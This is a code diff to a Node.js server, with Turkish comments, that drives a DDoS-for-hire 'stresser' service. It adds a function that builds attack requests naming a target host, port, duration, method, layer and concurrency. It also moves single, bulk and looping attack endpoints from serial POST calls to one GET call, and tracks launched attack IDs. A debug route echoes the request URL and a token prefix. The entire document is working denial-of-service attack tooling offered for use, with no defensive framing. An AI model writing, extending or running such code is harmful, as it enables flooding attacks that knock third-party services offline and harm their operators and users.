@@ -338,6 +338,36 @@ async function stopAttackApi(apiClient, apiToken, attackId) {
   return res.data;
 }
 
+function buildApiUrl(apiToken, params) {
+  const isL7 = params.layer === 'L7';
+  const bareHost = normalizeHost(params.host);
+  const host = isL7 ? `https://${bareHost}` : bareHost;
+  const geo = params.geo || 'worldwide';
+  const method = String(params.method || '');
+  const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
+  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} method=${method} geo=${geo} conc=${params.concurrents || 1}`);
+  return url;
+}
+
+async function startAttackApi(apiClient, params) {
+  const url = buildApiUrl(params.apiToken, params);
+  try {
+    const res = await apiClient.get(url, { timeout: 15000 });
+    console.log(`[startAttackApi] status=${res.status} data=${JSON.stringify(res.data).slice(0, 400)}`);
+    if (res.data?.status === 'error') {
+      throw new Error(res.data.message || 'API attack failed');
+    }
+    return res.data;
+  } catch (err) {
+    if (err.response) {
+      console.error(`[startAttackApi] HTTP ${err.response.status} error:`, JSON.stringify(err.response.data).slice(0, 400));
+    } else {
+      console.error(`[startAttackApi] request error:`, err.message);
+    }
+    throw err;
+  }
+}
+
 // stresse.st paneli concurrents kadar ayrı POST /attack istegi atar.
 // Asagidaki fonksiyonlar panelin gercek davranisini taklit eder.
 async function getCsrfToken(sessionId) {
@@ -379,45 +409,57 @@ async function startAttackPostApi(sessionId, params) {
   }
 }
 
-async function launchAttacksPost(sessionId, params, concurrents, loopId = null) {
+async function launchAttacksGet(sessionId, params, concurrents, loopId = null) {
+  const session = sessions[sessionId];
+  if (!session || !session.apiToken) {
+    throw new Error('API token not available');
+  }
+
+  // Once /ongoing'den mevcut ID'leri al.
   const beforeIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000));
 
-  // Paralel istekler stresse.st'te timeout/duplicate hatasina yol aciyor;
-  // istekleri sirayla (serial) gonderiyoruz. Daha yavas ama daha guvenilir.
-  const results = [];
-  for (let i = 0; i < concurrents; i++) {
-    try {
-      const result = await startAttackPostApi(sessionId, params);
-      results.push(result);
-    } catch (err) {
-      results.push({ status: 'error', message: err.message });
-    }
+  // Tek istekte istenen concurrents kadar saldiri baslat.
+  let data;
+  try {
+    data = await startAttackApi(getApiClient(sessionId), {
+      apiToken: session.apiToken,
+      ...params,
+      concurrents
+    });
+  } catch (err) {
+    console.error(`[launchAttacksGet] GET /api hata:`, err.message);
+    throw err;
   }
 
-  // Ongoing listesinin guncellenmesi icin bekle (stresse.st asenkron yansitiyor olabilir)
-  await new Promise((r) => setTimeout(r, 6000));
+  // API response'undaki attack_id'leri al.
+  let responseIds = [];
+  if (Array.isArray(data?.attack_id)) {
+    responseIds = data.attack_id;
+  } else if (data?.attack_id) {
+    responseIds = [data.attack_id];
+  } else if (data?.id) {
+    responseIds = [data.id];
+  }
+
+  // Ongoing listesinin guncellenmesi icin kisa bekle.
+  await new Promise((r) => setTimeout(r, 4000));
 
   const afterIds = new Set(await fetchOngoingAttackIds(sessionId, params, 1000));
-  const newIds = [...afterIds].filter((id) => !beforeIds.has(id));
 
-  const allStarted = results.every((r) => r?.message === 'Attack started');
-  const anyError = results.some((r) => r?.status === 'error' || (r?.message && r.message !== 'Attack started'));
+  // Onceki /ongoing'de olmayan yeni ID'leri tespit et.
+  let newIds = responseIds.filter((id) => !beforeIds.has(id));
 
-  // ID bulunamadi ama tum istekler basariliysa, limit kontrolu icin pending kayit ekle.
-  if (attackIds.length === 0 && allStarted && concurrents > 0) {
-    for (let i = 0; i < concurrents; i++) {
-      const pendingId = `pending_${sessionId.slice(0, 8)}_${Date.now()}_${i}_${Math.random().toString(36).substr(2, 5)}`;
-      registerAttack(pendingId, sessionId, params, loopId, 1);
-    }
+  // Eger response'taki ID'lerin hepsi eskiyse (tum aktifler listesi ise),
+  // after - before diff'inden yeni ID'leri cikar.
+  if (newIds.length === 0 && afterIds.size > beforeIds.size) {
+    newIds = [...afterIds].filter((id) => !beforeIds.has(id));
   }
 
-  console.log(`[launchAttacksPost] before=${beforeIds.size} after=${afterIds.size} new=${newIds.length} requested=${concurrents} allStarted=${allStarted} anyError=${anyError}`);
+  console.log(`[launchAttacksGet] before=${beforeIds.size} responseIds=${responseIds.length} after=${afterIds.size} new=${newIds.length} requested=${concurrents}`);
 
   return {
-    results,
-    attackIds: newIds.slice(0, concurrents),
-    allStarted,
-    anyError
+    data,
+    attackIds: newIds.slice(0, concurrents)
   };
 }
 
@@ -1028,9 +1070,16 @@ app.post('/api/stresse/attack', async (req, res) => {
       return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
     }
 
-    const { results, attackIds } = await launchAttacksPost(sessionId, {
-      host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet
-    }, 1);
+    let data, attackIds;
+    try {
+      const result = await launchAttacksGet(sessionId, {
+        host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet
+      }, 1);
+      data = result.data;
+      attackIds = result.attackIds;
+    } catch (err) {
+      return res.status(502).json({ status: 'error', message: err.message });
+    }
 
     if (attackIds.length > 0) {
       attackIds.forEach((attackId) => {
@@ -1044,7 +1093,7 @@ app.post('/api/stresse/attack', async (req, res) => {
 
     res.json({
       status: attackIds.length > 0 ? 'success' : 'error',
-      results,
+      data,
       attackIds,
       id: attackIds[0] || null,
       attack_id: attackIds[0] || null
@@ -1096,16 +1145,23 @@ app.post('/api/stresse/attack/bulk', async (req, res) => {
       return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
     }
 
-    // stresse.st paneli concurrents kadar ayri POST /attack istegi atar.
-    const { results, attackIds, allStarted } = await launchAttacksPost(sessionId, {
-      host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet
-    }, count);
+    // Tek istekte istenen concurrents kadar saldiri baslat.
+    let data, attackIds;
+    try {
+      const result = await launchAttacksGet(sessionId, {
+        host, port: parseInt(port), time: parseInt(time), method, layer, geo, subnet
+      }, count);
+      data = result.data;
+      attackIds = result.attackIds;
+    } catch (err) {
+      return res.status(502).json({ status: 'error', message: err.message });
+    }
 
     attackIds.forEach((attackId) => {
       registerAttack(attackId, sessionId, { host, port: parseInt(port), method, time, layer });
     });
 
-    const successCount = attackIds.length > 0 ? attackIds.length : (allStarted ? count : 0);
+    const successCount = attackIds.length > 0 ? attackIds.length : (data?.status === 'success' || data?.message === 'Attack started' ? count : 0);
 
     if (attackIds.length > 0) {
       addAttackHistory(sessionId, { host, port, method, time, layer }, {
@@ -1114,14 +1170,13 @@ app.post('/api/stresse/attack/bulk', async (req, res) => {
       });
     }
 
-    const firstMessage = results?.[0]?.message || '';
     res.json({
       status: successCount > 0 ? 'success' : 'error',
       total: count,
       successCount,
       failCount: count - successCount,
-      message: firstMessage,
-      data: results[0] || null,
+      message: data?.message || '',
+      data,
       id: attackIds[0] || null,
       attack_id: attackIds[0] || null,
       attackIds
@@ -1155,26 +1210,33 @@ app.post('/api/stresse/test-api', async (req, res) => {
       return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
     }
 
+    const apiToken = (typeof bodyToken === 'string' && bodyToken.trim()) ? bodyToken.trim() : session.apiToken;
+    const apiClient = getApiClient(sessionId);
+    const url = buildApiUrl(apiToken, {
+      host,
+      port: parseInt(port),
+      time: parseInt(time),
+      method,
+      geo,
+      layer,
+      concurrents: parseInt(concurrents)
+    });
+
     let upstreamRes = null;
     let upstreamErr = null;
     try {
-      upstreamRes = await startAttackPostApi(sessionId, {
-        host,
-        port: parseInt(port),
-        time: parseInt(time),
-        method,
-        geo,
-        layer,
-        subnet: '32'
-      });
+      upstreamRes = await apiClient.get(url, { timeout: 15000 });
     } catch (err) {
       upstreamErr = err;
     }
 
     res.json({
       status: 'debug',
-      upstreamStatus: upstreamRes ? 200 : (upstreamErr?.response?.status || null),
-      upstreamData: upstreamRes || (upstreamErr?.response?.data || upstreamErr?.message),
+      requestedUrl: url,
+      tokenSource: (typeof bodyToken === 'string' && bodyToken.trim()) ? 'body' : 'session',
+      tokenPrefix: apiToken.slice(0, 8),
+      upstreamStatus: upstreamRes?.status,
+      upstreamData: upstreamRes?.data,
       upstreamError: upstreamErr ? {
         message: upstreamErr.message,
         status: upstreamErr.response?.status,
@@ -1372,12 +1434,10 @@ async function runLoopRound(loopId) {
   let roundSuccesses = 0;
   let roundError = null;
 
-  // stresse.st paneli concurrents kadar ayri POST /attack istegi atar.
-  // ID'leri /ongoing diff'inden almaya calisiriz; bulunamazsa ama tum istekler
-  // Attack started dondururse basarili kabul ederiz (L4 saldirilari zaten
-  // durdurulamaz, panelde /ongoing uzerinden gorunurler).
+  // Tek istekte istenen concurrents kadar saldiri baslat.
+  // Gelen attack_id'lerden sadece onceki /ongoing'de olmayan yeni ID'leri kaydet.
   try {
-    const { results, attackIds, allStarted } = await launchAttacksPost(loop.sessionId, loop.params, loop.params.concurrents, loopId);
+    const { data, attackIds } = await launchAttacksGet(loop.sessionId, loop.params, loop.params.concurrents, loopId);
     if (attackIds.length > 0) {
       roundSuccesses = attackIds.length;
       loop.roundAttackIds = attackIds;
@@ -1388,13 +1448,12 @@ async function runLoopRound(loopId) {
       if (attackIds.length !== loop.params.concurrents) {
         console.warn(`[loop ${loopId}] round ${round} UYARI: stresse.st ${loop.params.concurrents} yerine ${attackIds.length} attackId dondurdu`);
       }
-    } else if (allStarted) {
+    } else if (data?.status === 'success' || data?.message === 'Attack started') {
       roundSuccesses = loop.params.concurrents;
       loop.roundAttackIds = [];
       console.log(`[loop ${loopId}] round ${round} basarili: ${roundSuccesses} saldiri baslatildi (ID bulunamadi, /ongoing'den gorunecek)`);
     } else {
-      const messages = results.map((r) => r?.message).filter(Boolean).join('; ');
-      roundError = new Error(`POST /attack basarisiz: ${messages || 'attackId bulunamadi'}`);
+      roundError = new Error(`GET /api basarisiz: ${data?.message || 'attackId bulunamadi'}`);
       console.error(`[loop ${loopId}] round ${round} hata:`, roundError.message);
     }
   } catch (err) {
